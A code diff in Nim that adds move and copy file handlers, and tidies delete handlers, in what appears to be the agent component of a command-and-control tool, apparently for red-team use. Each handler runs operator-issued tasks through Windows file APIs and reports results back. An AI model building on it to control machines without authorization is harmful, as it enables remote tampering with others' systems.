@@ -224,7 +224,6 @@ proc taskRm*(task: Task): TaskResult =
     echo fmt"Deleting file {target}."
 
     try: 
-        # Get current working directory using GetCurrentDirectory
         if DeleteFile(target) == FALSE:         
             raise newException(OSError, fmt"Failed to delete file ({GetLastError()}).")
 
@@ -252,9 +251,70 @@ proc taskRmdir*(task: Task): TaskResult =
     echo fmt"Deleting directory {target}."
 
     try: 
-        # Get current working directory using GetCurrentDirectory
         if RemoveDirectoryA(target) == FALSE:         
             raise newException(OSError, fmt"Failed to delete directory ({GetLastError()}).")
+
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(""),
+            status: Completed
+        )
+
+    except CatchableError as err: 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
+
+# Move file or directory
+proc taskMove*(task: Task): TaskResult = 
+
+    # Parse arguments
+    echo task.args
+    let 
+        params = parseJson(task.args)
+        lpExistingFileName = params["from"].getStr()
+        lpNewFileName = params["to"].getStr()
+
+    echo fmt"Moving {lpExistingFileName} to {lpNewFileName}."
+
+    try: 
+        if MoveFile(lpExistingFileName, lpNewFileName) == FALSE:         
+            raise newException(OSError, fmt"Failed to move file or directory ({GetLastError()}).")
+
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(""),
+            status: Completed
+        )
+
+    except CatchableError as err: 
+        return TaskResult(
+            task: task.id, 
+            agent: task.agent, 
+            data: encode(fmt"An error occured: {err.msg}" & "\n"),
+            status: Failed 
+        )
+
+# Copy file or directory
+proc taskCopy*(task: Task): TaskResult = 
+
+    # Parse arguments
+    let 
+        params = parseJson(task.args)
+        lpExistingFileName = params["from"].getStr()
+        lpNewFileName = params["to"].getStr()
+
+    echo fmt"Copying {lpExistingFileName} to {lpNewFileName}."
+
+    try: 
+        # Copy file to new location, overwrite if a file with the same name already exists
+        if CopyFile(lpExistingFileName, lpNewFileName, FALSE) == FALSE:         
+            raise newException(OSError, fmt"Failed to copy file or directory ({GetLastError()}).")
 
         return TaskResult(
             task: task.id, 
